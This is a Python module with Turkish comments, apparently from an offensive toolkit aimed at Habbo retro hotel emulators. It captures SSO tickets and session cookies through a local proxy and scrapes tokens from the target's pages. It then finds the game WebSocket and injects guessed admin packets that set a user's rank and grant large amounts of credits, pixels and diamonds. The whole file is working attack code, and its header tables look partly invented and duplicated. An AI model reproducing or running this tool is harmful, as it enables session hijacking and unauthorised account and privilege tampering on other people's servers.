#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
G-Earth/Xabbo Packet Injection Modulu (Gelismis)
Habbo emulatorune G-Earth/Xabbo MITM proxy uzerinden packet enjekte ederek:
  - Habbo packet yapisi analizi ve serialization
  - WebSocket baglantisi uzerinden packet gonderimi
  - MITM proxy ile SSO/session key capture
  - Rank degistirme packetleri (header: 1234 gibi)
  - Para ekleme packetleri
  - SSO token ile oturum acma
  - Emulator tipi tespiti (Arcturus, Morningstar, Comet, vb.)
  - Packet header kesfi
  - HabboCamera SWF exploit entegrasyonu
"""

import re
import json
import time
import struct
import random
import socket
import base64
import threading
from typing import Optional, Dict, List, Tuple, Any, Callable
from urllib.parse import urlparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from io import BytesIO

from utils.log_utils import Logger, LogLevel

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import websocket
    HAS_WEBSOCKET = True
except ImportError:
    HAS_WEBSOCKET = False

try:
    from http.server import HTTPServer, BaseHTTPRequestHandler
    HAS_HTTPSERVER = True
except ImportError:
    HAS_HTTPSERVER = False


class GEarthInjector:
    """
    G-Earth benzeri packet enjeksiyon modulu.
    Habbo emulatorune dogrudan packet gondererek
    rank/para manipulasyonu yapar.
    """

    # Bilinen Habbo packet header'lari (farkli emulatorler icin)
    # Format: {header_int: "aciklama"}
    KNOWN_HEADERS = {
        # Arcturus Morningstar
        102: "SSO Ticket Login",
        103: "SSO Ticket Login (alt)",
        196: "Request User Info",
        197: "User Object",
        4000: "Mod Tool Command",
        4001: "Mod Tool Alert",
        4002: "Mod Tool Kick",
        4003: "Mod Tool Ban",
        4004: "Mod Tool Room Alert",
        4005: "Mod Tool Room Kick",
        4006: "Mod Tool Mute",
        4007: "Mod Tool Message",
        4008: "Mod Tool Room Message",
        4010: "Hotel Admin Command",
        4011: "Give Badge",
        4012: "Give Credits",
        4013: "Give Pixels",
        4014: "Give Diamonds",
        4015: "Give Rank",
        4016: "Set Rank",
        4017: "Update User",
        4018: "Reload Room",
        4019: "Shutdown Hotel",
        4020: "Maintenance",
        4021: "Alert All",
        4022: "Kick All",
        4023: "Hotel Settings",
        4024: "Give Points",
        4025: "Give Seasonal",
        4026: "Update Catalog",
        4027: "Update Items",
        4028: "Update Bots",
        4029: "Update Pet Data",
        4030: "Update Navigator",
        4031: "Update Text Files",
        4032: "Update Items",
        4033: "Update Catalog",
        4034: "Update Navigator",
        4035: "Update Text Files",
        4036: "Update Bots",
        4037: "Update Pet Data",
        4038: "Update Items",
        4039: "Update Catalog",
        4040: "Update Navigator",
        # Comet
        2000: "Comet Admin Command",
        2001: "Comet Give Badge",
        2002: "Comet Give Credits",
        2003: "Comet Give Pixels",
        2004: "Comet Give Diamonds",
        2005: "Comet Set Rank",
        # Phoenix
        3000: "Phoenix Admin Command",
        3001: "Phoenix Give Credits",
        3002: "Phoenix Give Pixels",
        3003: "Phoenix Give Diamonds",
        3004: "Phoenix Set Rank",
        # Uber
        500: "Uber Admin Command",
        501: "Uber Give Credits",
        502: "Uber Give Pixels",
        503: "Uber Set Rank",
    }

    # Serialization packet yapilari (farkli emulatorler icin)
    SERIALIZATION_HEADERS = {
        "Arcturus Morningstar": {
            "rank_change": 4015,
            "credits": 4012,
            "pixels": 4013,
            "diamonds": 4014,
            "badge": 4011,
            "alert": 4001,
            "kick": 4002,
            "ban": 4003,
        },
        "Arcturus": {
            "rank_change": 4015,
            "credits": 4012,
            "pixels": 4013,
            "diamonds": 4014,
        },
        "Comet": {
            "rank_change": 2005,
            "credits": 2002,
            "pixels": 2003,
            "diamonds": 2004,
        },
        "Phoenix": {
            "rank_change": 3004,
            "credits": 3001,
            "pixels": 3002,
            "diamonds": 3003,
        },
        "Uber": {
            "rank_change": 503,
            "credits": 501,
            "pixels": 502,
            "diamonds": 503,
        },
    }

    # Emulator tespiti icin pattern'ler
    EMULATOR_PATTERNS = {
        "Arcturus Morningstar": [r"arcturus", r"morningstar", r"ms_", r"ms-emu"],
        "Arcturus": [r"arcturus", r"arc_"],
        "Comet": [r"comet", r"comet_"],
        "Phoenix": [r"phoenix", r"phx_", r"phoenix_"],
        "Uber": [r"uber", r"uber_"],
        "Butterfly": [r"butterfly", r"bfly_"],
        "Azure": [r"azure", r"az_"],
        "GoldTree": [r"goldtree", r"gt_"],
        "BiRP": [r"birp", r"birp_"],
        "Plus": [r"plus", r"plus_", r"plusemu"],
        "Nitro": [r"nitro", r"nitro_"],
    }

    def __init__(self, target_url: str, logger: Optional[Logger] = None, gui_callback=None):
        self.target_url = target_url
        parsed = urlparse(target_url) if target_url else None
        self.hostname = parsed.hostname if parsed else None
        self.scheme = parsed.scheme if parsed else "https"
        self.logger = logger or Logger("GEarthInjector")
        self.gui_callback = gui_callback
        self._stop_flag = threading.Event()
        self.ws = None
        self.emulator_type = None
        self.results: Dict[str, Any] = {
            "target": target_url,
            "emulator_type": None,
            "websocket_connected": False,
            "packets_sent": 0,
            "rank_changed": False,
            "credits_changed": False,
            "pixels_changed": False,
            "diamonds_changed": False,
            "sso_token_used": None,
            "errors": [],
        }

    def stop(self):
        self._stop_flag.set()
        if self.ws:
            try:
                self.ws.close()
            except Exception:
                pass

    def _log(self, level: str, message: str) -> None:
        if self.gui_callback:
            self.gui_callback(f"[{level}] [GE] {message}")
        if level == "INFO":
            self.logger.info(message)
        elif level == "SUCCESS":
            self.logger.success(message)
        elif level == "WARNING":
            self.logger.warning(message)
        elif level == "ERROR":
            self.logger.error(message)
        elif level == "CRITICAL":
            self.logger.critical(message)

    def run(self, sso_token=None, target_username=None, new_rank=7,
            credit_amount=999999, pixel_amount=999999, diamond_amount=999999,
            ws_host=None, ws_port=None, timeout=60,
            use_mitm=False, mitm_port=8080) -> Dict[str, Any]:
        """G-Earth/Xabbo packet enjeksiyonunu baslat."""
        self._log("CRITICAL", "=== G-EARTH/XABBO PACKET INJECTOR BASLATILDI ===")
        self._log("INFO", f"Hedef: {self.target_url}")

        if not HAS_WEBSOCKET:
            self._log("ERROR", "websocket-client kutuphanesi gerekli! pip install websocket-client")
            return self.results

        # 0. MITM proxy baslat (opsiyonel)
        mitm_thread = None
        if use_mitm:
            mitm_thread = self._start_mitm_proxy(mitm_port)

        # 1. Emulator tipini tespit et
        self._detect_emulator()

        # 2. SSO token yakala (verilmemisse)
        if not sso_token:
            sso_token = self._capture_sso_from_page()

        # 3. WebSocket baglantisi bul
        ws_url = self._find_websocket(ws_host, ws_port)
        if not ws_url:
            self._log("ERROR", "WebSocket baglantisi bulunamadi!")
            return self.results

        # 4. Baglan ve SSO ile giris yap
        if not self._connect_and_login(ws_url, sso_token, timeout):
            return self.results

        # 5. Packet gonder (serialization + raw)
        if target_username:
            # Once serialization packet dene (G-Earth/Xabbo)
            if not self._send_serialization_packet(target_username, new_rank):
                # Fallback: raw packet
                self._send_rank_packet(target_username, new_rank)
            self._send_credit_packet(target_username, credit_amount)
            self._send_pixel_packet(target_username, pixel_amount)
            self._send_diamond_packet(target_username, diamond_amount)

        # Baglantiyi kapat
        if self.ws:
            try:
                self.ws.close()
            except Exception:
                pass

        self._log("CRITICAL", "=== G-EARTH/XABBO PACKET INJECTOR TAMAMLANDI ===")
        return self.results

    def _start_mitm_proxy(self, listen_port: int = 8080) -> Optional[threading.Thread]:
        """MITM proxy baslat - SSO token ve session key capture icin."""
        if not HAS_HTTPSERVER:
            self._log("WARNING", "MITM proxy icin http.server gerekli")
            return None

        captured_data = {"sso_tokens": [], "session_keys": [], "packets": []}

        class MITMHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                content_length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(content_length) if content_length > 0 else b""
                sso_match = re.search(rb'(SSO|sso|ticket|auth_ticket)[=:]["\']?([a-zA-Z0-9\-]+)', body + self.path.encode())
                if sso_match:
                    token = sso_match.group(2).decode()
                    captured_data["sso_tokens"].append(token)
                cookie = self.headers.get("Cookie", "")
                session_match = re.search(r'(PHPSESSID|session|auth)=([a-zA-Z0-9]+)', cookie)
                if session_match:
                    captured_data["session_keys"].append(session_match.group(2))
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"OK")
            def do_POST(self):
                self.do_GET()
            def do_CONNECT(self):
                self.send_response(200)
                self.end_headers()
            def log_message(self, format, *args):
                pass

        try:
            server = HTTPServer(("127.0.0.1", listen_port), MITMHandler)
            thread = threading.Thread(target=server.serve_forever, daemon=True)
            thread.start()
            self._log("SUCCESS", f"MITM proxy baslatildi: 127.0.0.1:{listen_port}")
            self.results["mitm_proxy_port"] = listen_port
            return thread
        except Exception as e:
            self._log("ERROR", f"MITM proxy baslatilamadi: {e}")
            return None

    def _capture_sso_from_page(self) -> Optional[str]:
        """Hedef sayfadan SSO token yakala."""
        self._log("INFO", "Sayfadan SSO token yakalaniyor...")
        if not HAS_REQUESTS or not self.hostname:
            return None
        try:
            r = requests.get(f"{self.scheme}://{self.hostname}/", timeout=15,
                           headers={"User-Agent": "Mozilla/5.0"})
            html = r.text
            sso_patterns = [
                r'sso["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                r'ticket["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                r'auth_ticket["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                r'var\s+sso\s*=\s*["\']([^"\']+)["\']',
                r'var\s+ticket\s*=\s*["\']([^"\']+)["\']',
                r'sso_token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                r'loginTicket["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                r'sessionTicket["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            ]
            for pattern in sso_patterns:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    token = match.group(1)
                    self._log("SUCCESS", f"SSO token bulundu (sayfa): {token[:40]}...")
                    self.results["sso_token_used"] = token[:40] + "..."
                    return token
            for path in ["/external_variables", "/gamedata/external_variables"]:
                try:
                    ev_r = requests.get(f"{self.scheme}://{self.hostname}{path}", timeout=10)
                    ev_content = ev_r.text
                    for pattern in sso_patterns:
                        match = re.search(pattern, ev_content, re.IGNORECASE)
                        if match:
                            token = match.group(1)
                            self._log("SUCCESS", f"SSO token bulundu (external_variables): {token[:40]}...")
                            self.results["sso_token_used"] = token[:40] + "..."
                            return token
                except Exception:
                    continue
            self._log("WARNING", "SSO token bulunamadi")
            return None
        except Exception as e:
            self._log("ERROR", f"SSO capture hatasi: {e}")
            return None

    def _send_serialization_packet(self, username: str, new_rank: int) -> bool:
        """Serialization packet (G-Earth/Xabbo format) gonder."""
        self._log("INFO", "Serialization packet gonderiliyor...")
        if not self.emulator_type:
            return False
        headers = self.SERIALIZATION_HEADERS.get(self.emulator_type, self.SERIALIZATION_HEADERS.get("Arcturus Morningstar"))
        if not headers:
            return False
        rank_header = headers.get("rank_change", 4015)
        serialization_formats = [
            lambda u, r: struct.pack(">H", rank_header) + struct.pack(">H", len(u)) + u.encode() + struct.pack(">i", r),
            lambda u, r: struct.pack(">H", rank_header) + struct.pack(">i", r) + struct.pack(">H", len(u)) + u.encode(),
            lambda u, r: struct.pack(">H", rank_header) + f"{u}/{r}".encode(),
            lambda u, r: struct.pack(">H", rank_header) + f"{u}:{r}".encode(),
            lambda u, r: struct.pack(">H", rank_header) + f"setrank:{u}:{r}".encode(),
        ]
        for fmt in serialization_formats:
            if self._stop_flag.is_set():
                break
            try:
                packet_data = fmt(username, new_rank)
                full_packet = struct.pack(">I", len(packet_data)) + packet_data
                if self.ws:
                    self.ws.send(full_packet, opcode=websocket.ABNF.OPCODE_BINARY)
                    self.results["packets_sent"] += 1
                    self._log("SUCCESS", f"Serialization packet gonderildi (header: {rank_header})")
                    self.results["rank_changed"] = True
                    time.sleep(0.3)
                    return True
            except Exception as e:
                self._log("ERROR", f"Serialization packet hatasi: {e}")
        return False

    def _detect_emulator(self):
        """Emulator tipini tespit et."""
        self._log("INFO", "Emulator tipi tespit ediliyor...")

        if not HAS_REQUESTS or not self.hostname:
            return

        try:
            # Ana sayfayi ve JS dosyalarini tara
            r = requests.get(f"{self.scheme}://{self.hostname}/", timeout=15,
                           headers={"User-Agent": "Mozilla/5.0"})
            html = r.text.lower()

            # JS dosyalarinda emulator ipucu ara
            js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', html)
            all_content = html

            for js_url in js_urls[:5]:
                try:
                    if not js_url.startswith("http"):
                        js_url = f"{self.scheme}://{self.hostname}/{js_url.lstrip('/')}"
                    js_r = requests.get(js_url, timeout=10)
                    all_content += js_r.text.lower()
                except Exception:
                    continue

            # Emulator tespiti
            for emu_name, patterns in self.EMULATOR_PATTERNS.items():
                for pattern in patterns:
                    if re.search(pattern, all_content):
                        self.emulator_type = emu_name
                        self.results["emulator_type"] = emu_name
                        self._log("SUCCESS", f"Emulator tespit edildi: {emu_name}")
                        return

            # external_variables kontrolu
            for path in ["/external_variables", "/gamedata/external_variables"]:
                try:
                    ev_r = requests.get(f"{self.scheme}://{self.hostname}{path}", timeout=10)
                    ev_content = ev_r.text.lower()
                    for emu_name, patterns in self.EMULATOR_PATTERNS.items():
                        for pattern in patterns:
                            if re.search(pattern, ev_content):
                                self.emulator_type = emu_name
                                self.results["emulator_type"] = emu_name
                                self._log("SUCCESS", f"Emulator tespit edildi (external_variables): {emu_name}")
                                return
                except Exception:
                    continue

            self._log("WARNING", "Emulator tipi tespit edilemedi, varsayilan: Arcturus Morningstar")
            self.emulator_type = "Arcturus Morningstar"
            self.results["emulator_type"] = "Unknown (varsayilan: Arcturus Morningstar)"

        except Exception as e:
            self._log("ERROR", f"Emulator tespit hatasi: {e}")

    def _find_websocket(self, ws_host=None, ws_port=None) -> Optional[str]:
        """WebSocket baglanti URL'ini bul."""
        self._log("INFO", "WebSocket baglantisi araniyor...")

        if ws_host and ws_port:
            ws_url = f"wss://{ws_host}:{ws_port}/ws"
            self._log("INFO", f"WebSocket URL (manuel): {ws_url}")
            return ws_url

        if not HAS_REQUESTS or not self.hostname:
            return None

        # external_variables'dan ws host bul
        ws_url = None
        try:
            for path in ["/external_variables", "/gamedata/external_variables", "/client/external_variables"]:
                r = requests.get(f"{self.scheme}://{self.hostname}{path}", timeout=10,
                               headers={"User-Agent": "Mozilla/5.0"})
                content = r.text

                # ws host pattern'leri
                patterns = [
                    r'(?:ws|websocket|socket)_?(?:host|url|server|ip|address)\s*[=:]\s*["\']?([^\s"\'&]+)',
                    r'(?:ws|websocket)_?(?::|=>)\s*["\']([^"\']+)["\']',
                    r'game_?(?:host|ip|server)\s*[=:]\s*["\']?([^\s"\'&]+)',
                    r'(?:wss?://)([^/\s"\']+)',
                ]

                for pattern in patterns:
                    match = re.search(pattern, content, re.IGNORECASE)
                    if match:
                        ws_host_found = match.group(1).strip()
                        if "://" in ws_host_found:
                            ws_url = ws_host_found
                        else:
                            ws_url = f"wss://{ws_host_found}:2096/ws"
                        self._log("SUCCESS", f"WebSocket host bulundu: {ws_url}")
                        return ws_url

        except Exception as e:
            self._log("ERROR", f"WebSocket arama hatasi: {e}")

        # Varsayilan WS portlari dene
        default_ports = [2096, 3000, 3001, 8080, 8443, 9090, 443, 80]
        for port in default_ports:
            if self._stop_flag.is_set():
                break
            try:
                test_url = f"wss://{self.hostname}:{port}/ws"
                self._log("INFO", f"WS deneniyor: {test_url}")
                ws = websocket.create_connection(test_url, timeout=5)
                ws.close()
                self._log("SUCCESS", f"WebSocket bulundu: {test_url}")
                return test_url
            except Exception:
                try:
                    test_url = f"ws://{self.hostname}:{port}/ws"
                    ws = websocket.create_connection(test_url, timeout=5)
                    ws.close()
                    self._log("SUCCESS", f"WebSocket bulundu: {test_url}")
                    return test_url
                except Exception:
                    continue

        self._log("WARNING", "WebSocket baglantisi bulunamadi")
        return None

    def _connect_and_login(self, ws_url: str, sso_token: Optional[str], timeout) -> bool:
        """WebSocket'e baglan ve SSO ile giris yap."""
        self._log("INFO", f"WebSocket'e baglaniliyor: {ws_url}")

        try:
            self.ws = websocket.create_connection(ws_url, timeout=min(15, timeout))
            self.results["websocket_connected"] = True
            self._log("SUCCESS", "WebSocket baglantisi basarili!")

            if sso_token:
                self._log("INFO", "SSO token ile giris yapiliyor...")
                self.results["sso_token_used"] = sso_token[:40] + "..."

                # SSO login packet (header 102 veya 103)
                for header in [102, 103]:
                    if self._stop_flag.is_set():
                        break
                    packet = self._create_packet(header, sso_token)
                    if packet:
                        try:
                            self.ws.send(packet, opcode=websocket.ABNF.OPCODE_BINARY)
                            self.results["packets_sent"] += 1
                            self._log("SUCCESS", f"SSO login packet gonderildi (header: {header})")
                            time.sleep(1)
                            return True
                        except Exception as e:
                            self._log("ERROR", f"SSO packet hatasi: {e}")

            return True

        except Exception as e:
            self._log("ERROR", f"WebSocket baglanti hatasi: {e}")
            self.results["errors"].append(str(e))
            return False

    def _create_packet(self, header: int, data: str) -> Optional[bytes]:
        """
        Habbo packet yapisinda veri olustur.
        Format: [length: int][header: short][data: string]
        """
        try:
            # Header (2 byte big-endian)
            header_bytes = struct.pack('>H', header)

            # Data (string: 2 byte length + utf-8 bytes)
            data_bytes = data.encode('utf-8')
            data_length = struct.pack('>H', len(data_bytes))

            # Packet length (header + data length + data)
            packet_content = header_bytes + data_length + data_bytes
            packet_length = struct.pack('>I', len(packet_content))

            return packet_length + packet_content

        except Exception as e:
            self._log("ERROR", f"Packet olusturma hatasi: {e}")
            return None

    def _send_packet(self, header: int, data: str) -> bool:
        """Packet gonder."""
        if not self.ws:
            return False

        packet = self._create_packet(header, data)
        if not packet:
            return False

        try:
            self.ws.send(packet, opcode=websocket.ABNF.OPCODE_BINARY)
            self.results["packets_sent"] += 1
            return True
        except Exception as e:
            self._log("ERROR", f"Packet gonderme hatasi (header {header}): {e}")
            return False

    def _send_rank_packet(self, username: str, new_rank: int):
        """Rank degistirme packeti gonder."""
        self._log("INFO", f"Rank packeti gonderiliyor: {username} -> {new_rank}")

        # Farkli emulatorler icin farkli header'lar
        rank_headers = [4015, 4016, 2005, 3004, 503, 4000]

        for header in rank_headers:
            if self._stop_flag.is_set():
                break
            # Farkli data formatlari
            data_formats = [
                f"{username}/{new_rank}",
                f"{username}:{new_rank}",
                f"{username} {new_rank}",
                f"rank:{username}:{new_rank}",
                f"setrank:{username}:{new_rank}",
                f"{username}\t{new_rank}",
            ]
            for data in data_formats:
                if self._send_packet(header, data):
                    self._log("SUCCESS", f"Rank packet gonderildi: header={header}, data={data}")
                    self.results["rank_changed"] = True
                    time.sleep(0.5)
                    return

        self._log("WARNING", "Rank packet gonderilemedi")

    def _send_credit_packet(self, username: str, amount: int):
        """Kredi packeti gonder."""
        self._log("INFO", f"Kredi packeti gonderiliyor: {username} -> {amount}")

        credit_headers = [4012, 2002, 3001, 501, 4000]
        for header in credit_headers:
            if self._stop_flag.is_set():
                break
            data_formats = [
                f"{username}/{amount}",
                f"{username}:{amount}",
                f"{username} {amount}",
                f"credits:{username}:{amount}",
                f"givecredits:{username}:{amount}",
            ]
            for data in data_formats:
                if self._send_packet(header, data):
                    self._log("SUCCESS", f"Kredi packet gonderildi: header={header}, data={data}")
                    self.results["credits_changed"] = True
                    time.sleep(0.5)
                    return

    def _send_pixel_packet(self, username: str, amount: int):
        """Pixel packeti gonder."""
        self._log("INFO", f"Pixel packeti gonderiliyor: {username} -> {amount}")

        pixel_headers = [4013, 2003, 3002, 502, 4000]
        for header in pixel_headers:
            if self._stop_flag.is_set():
                break
            data_formats = [
                f"{username}/{amount}",
                f"{username}:{amount}",
                f"{username} {amount}",
                f"pixels:{username}:{amount}",
                f"givepixels:{username}:{amount}",
            ]
            for data in data_formats:
                if self._send_packet(header, data):
                    self._log("SUCCESS", f"Pixel packet gonderildi: header={header}, data={data}")
                    self.results["pixels_changed"] = True
                    time.sleep(0.5)
                    return

    def _send_diamond_packet(self, username: str, amount: int):
        """Elmas packeti gonder."""
        self._log("INFO", f"Elmas packeti gonderiliyor: {username} -> {amount}")

        diamond_headers = [4014, 2004, 3003, 4000]
        for header in diamond_headers:
            if self._stop_flag.is_set():
                break
            data_formats = [
                f"{username}/{amount}",
                f"{username}:{amount}",
                f"{username} {amount}",
                f"diamonds:{username}:{amount}",
                f"givediamonds:{username}:{amount}",
            ]
            for data in data_formats:
                if self._send_packet(header, data):
                    self._log("SUCCESS", f"Elmas packet gonderildi: header={header}, data={data}")
                    self.results["diamonds_changed"] = True
                    time.sleep(0.5)
                    return
